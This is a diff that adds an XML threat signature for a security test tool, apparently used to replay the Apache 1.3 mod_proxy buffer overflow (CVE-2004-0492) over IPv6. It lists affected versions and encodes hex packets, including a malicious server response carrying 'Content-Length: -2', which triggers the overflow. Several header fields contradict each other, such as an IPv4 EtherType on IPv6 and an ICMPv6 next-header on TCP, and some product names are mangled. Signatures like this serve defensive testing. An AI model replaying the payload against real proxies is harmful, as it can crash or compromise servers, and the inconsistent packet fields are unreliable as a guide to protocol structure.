@@ -1,0 +1,121 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apache 1.3 mod_proxy Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="A vulnerability exists in the mod_proxy module of Apache 1.3, which can be used as a web proxy, reverse proxy, and/or cache. This module contains a heap-based buffer overflow that occurs while retrieving an HTTP response from a malicious server on behalf of a client. An attacker may use this vulnerability to trigger a denial of service on the vulnerable Apache server. There is also the possibility of remote code execution on some older operating system platforms.            On most platforms, upon reception of a specially crafted response, the child process acting as a proxy for a client will terminate, closing any open TCP connections. As neither the parent Apache process nor any other child processes are affected, the denial of service condition only affects connections being handled by the process being attacked (possible only the attacking client). Other connections to the Apache server will be unaffected. On some older OpenBSD and FreeBSD distributions, the vulnerability can be exploited to execute code, due to the particulars of their implementation of the memcpy() function. In such cases, the behaviour of the compromised server depends on the nature of the exploit code. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="UNKNOWN"/>
+    </Intent>
+    <Protocol display="true" value="HTTPALT/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apache_Software_Foundation"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_HTTP_Server"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_Debian_GNU/Linux"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_FreeBSD"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_HP-UX"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_VirtualVault"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_Webproxy"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_WebSphere_Application_Server"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_Linux"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_Enterprise_Linux"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_Irix"/>
+      <item value="Apache_Software_Foundation_Apache_Software_Foundation_SUSE_Linux"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Apache_Software_Foundation_HTTP_Server_1.3.25_-_1.3.31"/>
+      <item value="Apache_Software_Foundation_Debian_GNU/Linux_3.0"/>
+      <item value="Apache_Software_Foundation_FreeBSD_4.10_(1.3.29)"/>
+      <item value="Apache_Software_Foundation_FreeBSD_4.9_(1.3.28)"/>
+      <item value="Apache_Software_Foundation_FreeBSD_5.0"/>
+      <item value="Apache_Software_Foundation_FreeBSD_5.1_(1.3.27)"/>
+      <item value="Apache_Software_Foundation_FreeBSD_5.2_(1.3.29)"/>
+      <item value="Apache_Software_Foundation_FreeBSD_5.2.1_(1.3.29)"/>
+      <item value="Apache_Software_Foundation_HP-UX_11.0_4_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_VirtualVault_4.5_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_VirtualVault_VirtualVault_4.6_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_Webproxy_2.0_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_WebSphere_Application_Server_3.5.x"/>
+      <item value="Apache_Software_Foundation_Linux_10.0_(1.3.29)"/>
+      <item value="Apache_Software_Foundation_Linux_9.0_(1.3.26)"/>
+      <item value="Apache_Software_Foundation_Linux_9.1_(1.3.27)"/>
+      <item value="Apache_Software_Foundation_Linux_9.2_(1.3.28)"/>
+      <item value="Apache_Software_Foundation_Enterprise_Linux_2.1_AS/ES/WS_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_Irix_6.5.14_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_Irix_6.5.15_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_Irix_6.5.16_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_Irix_6.5.17_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_Irix_6.5.18_(1.3.27)*"/>
+      <item value="Apache_Software_Foundation_Irix_6.5.19_(1.3.27)*"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040610-01"/>
+    <CVEID display="true" value="CVE-2004-0492"/>
+    <bugtraqID display="true" value="10508"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="b51b9ae71de83c74e57d3403f7a2fa59"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Complete"/>
+    <IntegImpact display="false" value="Complete"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1250535021"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1250516366" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="N"/>
+    <NamedVar name="HTTPALTdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPALTdestPort" SeqNumber="D3808B36" AckNumber="3050D031" HeaderLength="08" WindowSize="16D0" Checksum="31E5" UrgentPointer="0000" Options="0101080A083AE764249352BE" Payload="474554202F20485454502F312E310D0A486F73743A2031302E322E312E333A383038300D0A436F6E6E656374696F6E3A20636C6F73650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="3050D031" AckNumber="D3808B70" HeaderLength="08" WindowSize="16A0" Checksum="B24D" UrgentPointer="0000" Options="0101080A249352BE083AE764" Payload="485454502F312E3020323030204F4B0D0A436F6E74656E742D4C656E6774683A202D320D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
